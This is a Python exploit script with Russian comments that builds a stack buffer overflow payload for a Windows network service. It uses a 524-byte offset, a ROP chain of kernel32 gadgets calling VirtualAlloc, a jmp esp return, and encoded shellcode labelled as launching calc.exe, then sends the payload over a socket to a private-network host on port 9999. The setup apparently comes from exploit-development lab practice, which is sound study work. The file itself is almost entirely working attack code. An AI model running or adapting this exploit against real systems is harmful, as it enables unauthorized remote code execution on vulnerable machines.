import struct

class OffsetPacker:
    def __init__(self, base):
        self.base = base
    
    def __call__(self, offset):
        return struct.pack("<I", self.base + offset)

# Создаем упаковщики для разных модулей
kernel32_p32 = OffsetPacker(base=0x766F0000)
msvcrt_p32 = OffsetPacker(base=0x76F10000)



# Базовый адрес модуля (например, kernel32.dll)
MODULE_BASE = 0x6B800000

def p32_offset(offset):
    """Принимает offset, прибавляет к базовому адресу модуля, возвращает bytes."""
    return struct.pack("<I", MODULE_BASE + offset)

def p32(x): return struct.pack("<I", x)

offset = 524
addr_VA = b"\xC0\x37\x2C\x77" #0x772C37C0       # Правильный адрес VirtualAlloc
addr_jmp_esp = b"\xF3\x12\x17\x31" #0x311712F3  # Адрес jmp esp

# Шеллкод для запуска calc.exe (пример)
shellcode = b"\x90" * 16 + \
b"\xdb\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x33\xba\xa5" \
b"\x0b\x9e\x3b\x31\x53\x18\x83\xc3\x04\x03\x53\xb0\x2b" \
b"\x4d\xd6\x20\x2e\xae\x27\xb1\x4f\x26\xc2\x80\x5f\x3c" \
b"\x86\xb2\x6f\x36\xca\x3e\x1b\x1a\xff\xb5\x69\xb3\xf0" \
b"\x7e\xc7\xe5\x3f\x7f\x64\x09\x21\x03\x77\x5e\x81\x3a" \
b"\xb8\x93\x40\x7b\xa5\x5e\x10\xd4\xa1\xcd\x85\x51\xff" \
b"\xcd\x2e\x29\x11\x56\xd2\xf9\x10\x77\x45\x72\x4b\x57" \
b"\x67\x57\xe7\xde\x7f\xb4\xc2\xa9\x0c\x0e\xb8\x28\xc4" \
b"\x5f\x41\x86\x29\x50\xb0\xd6\x6e\x47\x2b\xad\x86\xa4"

# Адреса гаджетов
pop_eax = kernel32_p32(0x00018FAF)  # -> p32(0x6B818FAF)      # pop eax; ret
xor_eax = kernel32_p32(0x00017130)      # xor eax, eax; ret
mov_ecx_eax = kernel32_p32(0x00019660)  # mov ecx, eax; mov eax, ecx; pop ebp; ret
push_ecx = kernel32_p32(0x00027a37)     # push ecx; ret

# Цепочка для lpAddress = 0
lpAddress_chain = b""
lpAddress_chain += pop_eax             
lpAddress_chain += p32(0x11111111)     # Мусор (затрется xor)
lpAddress_chain += xor_eax             # EAX = 0
lpAddress_chain += mov_ecx_eax         # ECX = 0 → затем извлекаем мусор в EBP
lpAddress_chain += p32(0xFFFFFFFF)     # Мусор для pop ebp
lpAddress_chain += push_ecx            # push ecx (0) → lpAddress = 0

# Параметры для VirtualAlloc в обратном порядке для стека
flProtect = b"\x44\x44\x44\x44"
flAllocationType = b"\x43\x43\x43\x43"
dwSize = b"\x01\x01\x01\x01"
lpAddress = lpAddress_chain #b"\x41\x41\x41\x41"

payload = b"A" * offset

#payload += lpAddress_chain                           # Устанавливаем lpAddress = 0

payload += p32(0x772C37C0) #addr_VA                  #EIP → VirtualAlloc
payload += p32(0x311712F3) #addr_jmp_esp             # return address (jmp esp)
payload += lpAddress                # lpAddress
payload += dwSize                   # dwSize 1000
payload += flAllocationType         # flAllocationType
payload += flProtect                #flProtect
#print(payload)
payload += shellcode

# Проверки:
badchars = [b"\x00", b"\x0a", b"\x0d"]
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f"Payload contains one of badchars: {badchars!r}"


# Отправка
import socket
s = socket.create_connection(("192.168.56.113", 9999))
s.send(payload)
s.close()
